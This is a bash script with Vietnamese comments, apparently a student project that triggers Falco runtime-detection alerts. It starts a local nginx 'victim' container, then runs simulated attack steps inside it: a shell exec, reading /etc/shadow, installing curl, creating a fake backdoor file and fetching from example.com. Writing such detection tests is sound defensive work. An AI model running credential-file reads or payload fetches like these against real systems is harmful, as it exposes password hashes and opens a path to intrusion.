#!/bin/bash
# ==============================================================================
# KỊCH BẢN THỰC NGHIỆM TẤN CÔNG / HÀNH VI BẤT THƯỜNG TRONG CONTAINER (DEMO ĐỒ ÁN)
# ==============================================================================

echo "========================================================================"
echo " KHỞI CHẠY CONTAINER NẠN NHÂN (VICTIM CONTAINER)"
echo "========================================================================"
docker run -d --name victim-web -p 8080:80 nginx:alpine
sleep 2

echo -e "\n[KỊCH BẢN 1]: MỞ TERMINAL SHELL TRÁI PHÉP VÀO CONTAINER (Priority: Warning)"
echo ">> Mô tả: Kẻ tấn công hoặc người dùng truy cập interactive shell vào container"
echo ">> Lệnh thực thi:"
docker exec -i victim-web sh -c "uname -a && whoami"
sleep 3

echo -e "\n[KỊCH BẢN 2]: TRUY CẬP ĐỌC FILE MẬT KHẨU NHẠY CẢM /etc/shadow (Priority: Critical)"
echo ">> Mô tả: Tiến trình lạ đọc thông tin hash mật khẩu /etc/shadow"
echo ">> Lệnh thực thi:"
docker exec victim-web cat /etc/shadow
sleep 3

echo -e "\n[KỊCH BẢN 3]: CÀI ĐẶT CÔNG CỤ QUÉT MẠNG TRÁI PHÉP (Priority: Notice / Error)"
echo ">> Mô tả: Chạy trình quản lý gói apk để cài nmap/curl lạ trong runtime container"
echo ">> Lệnh thực thi:"
docker exec victim-web apk add --no-cache curl
sleep 3

echo -e "\n[KỊCH BẢN 4]: THAY ĐỔI FILE THỰC THI HỆ THỐNG /bin/ls (Priority: Critical)"
echo ">> Mô tả: Ghi đè file binary cốt lõi của Linux để duy trì quyền truy cập (Persistence)"
echo ">> Lệnh thực thi:"
docker exec victim-web touch /bin/malicious_backdoor
sleep 3

echo -e "\n[KỊCH BẢN 5]: THỰC HIỆN TẢI PAYLOAD QUA ĐƯỜNG MẠNG (Priority: Warning)"
echo ">> Mô tả: Container cố gắng tải script từ bên ngoài qua curl"
docker exec victim-web curl -s http://example.com > /dev/null
sleep 2

echo "========================================================================"
echo " ĐÃ HOÀN TẤT KỊCH BẢN TẤN CÔNG DEMO!"
echo " Hãy mở Falcosidekick-UI trên trình duyệt: http://localhost:2802"
echo "========================================================================"
